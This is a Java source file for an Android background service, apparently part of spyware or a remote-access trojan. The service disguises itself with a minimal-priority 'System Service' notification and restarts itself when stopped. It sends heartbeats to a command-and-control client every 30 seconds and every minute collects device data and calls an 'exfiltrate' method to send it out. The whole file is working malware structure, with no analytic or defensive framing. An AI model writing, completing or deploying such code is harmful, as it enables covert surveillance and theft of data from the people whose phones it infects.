package com.system.service.core;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import com.system.service.C2Client;
import com.system.service.collection.DataCollector;
import com.system.service.R;

public class PersistenceService extends Service {

    private static final String CHANNEL_ID = "sys_service_channel";
    private static final int NOTIFICATION_ID = 1001;
    private static final long HEARTBEAT_INTERVAL = 30000; // 30 seconds
    private static final long COLLECTION_INTERVAL = 60000; // 1 minute

    private Handler handler;
    private Runnable heartbeatTask;
    private Runnable collectionTask;
    private C2Client c2Client;
    private DataCollector dataCollector;
    private SharedPreferences prefs;
    private boolean isRunning = false;

    public static void start(Context context) {
        Intent intent = new Intent(context, PersistenceService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
        prefs = getSharedPreferences("sys_cfg", MODE_PRIVATE);
        c2Client = new C2Client(this);
        dataCollector = new DataCollector(this);
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            scheduleTasks();
            c2Client.connect();
        }
        return START_STICKY;
    }

    private void scheduleTasks() {
        heartbeatTask = new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    c2Client.sendHeartbeat();
                    handler.postDelayed(this, HEARTBEAT_INTERVAL);
                }
            }
        };

        collectionTask = new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    collectAndExfiltrate();
                    handler.postDelayed(this, COLLECTION_INTERVAL);
                }
            }
        };

        handler.post(heartbeatTask);
        handler.postDelayed(collectionTask, 5000);
    }

    private void collectAndExfiltrate() {
        new Thread(() -> {
            try {
                String data = dataCollector.collectAll();
                if (data != null && !data.isEmpty()) {
                    c2Client.exfiltrate(data);
                }
            } catch (Exception e) {
                Log.e("PersistenceService", "Collection failed", e);
            }
        }).start();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background system operations");
            channel.setSound(null, null);
            channel.enableVibration(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE);

        return new Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .build();
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        handler.removeCallbacks(heartbeatTask);
        handler.removeCallbacks(collectionTask);
        c2Client.disconnect();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}